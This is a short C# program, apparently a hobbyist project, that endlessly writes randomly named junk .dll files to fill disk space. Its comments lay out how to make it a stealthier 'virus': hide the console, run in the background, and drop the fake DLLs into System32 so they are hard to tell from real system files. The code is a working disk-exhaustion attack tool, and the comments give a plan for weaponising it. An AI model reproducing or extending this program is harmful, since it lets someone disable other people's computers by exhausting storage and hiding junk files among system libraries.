namespace controller
{
    using System;
    using System.Text;
    using System.IO;

    public class DLLFileBombing
    {
        public static void Main()
        {
            // This script creates gibberish dll files only in the current directory of the assembly. Not outside of it.
            // Approximately 2.20 GB in 1 minute or less (summed up by size). In 1 hour it reaches up to 130 GB and wipes out a lot of disk space.

            // WHAT CAN BE DONE TO BE MORE ADVANCED?

            // Making the console window not appear and run in the background.
            // Making the file as an executable and putting the files into the System32 directory.
            // Thus it will be extremely difficult for the user to delete the fake dll files instead of the original ones in the sys32 dir.
            // In other words this can be used as a virus which eats disk space in the background if the requirements above are completed.
            Random random = new Random();
            try
            {
                while (true)
                {
                    StringBuilder textContent = new StringBuilder();
                    int randomSize = random.Next(10000, 25001);
                    for (int i = 0; i < randomSize; i++)
                    {
                        textContent.Append("\u0DF4");
                    }
                    string fileName = GenerateRandomFileName();
                    string path = $@"C:\Users\Aorus\source\repos\controller\controller\{fileName}.dll";
                    if (File.Exists(path))
                    {
                        File.Delete(path);
                    }
                    using (FileStream file = File.Create(path))
                    {
                        byte[] buffer = new UTF8Encoding(true).GetBytes(textContent.ToString());
                        file.Write(buffer, 0, buffer.Length);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message} Please start the application again.");
            }
        }

        private static string GenerateRandomFileName()
        {
            Random random = new Random();
            StringBuilder fileName = new StringBuilder();
            for (int i = 0; i < 10; i++)
            {
                int randomChar = random.Next(97, 123);
                char charToAscii = (char)randomChar;
                fileName.Append(charToAscii.ToString());
            }
            return fileName.ToString();
        }
    }
}
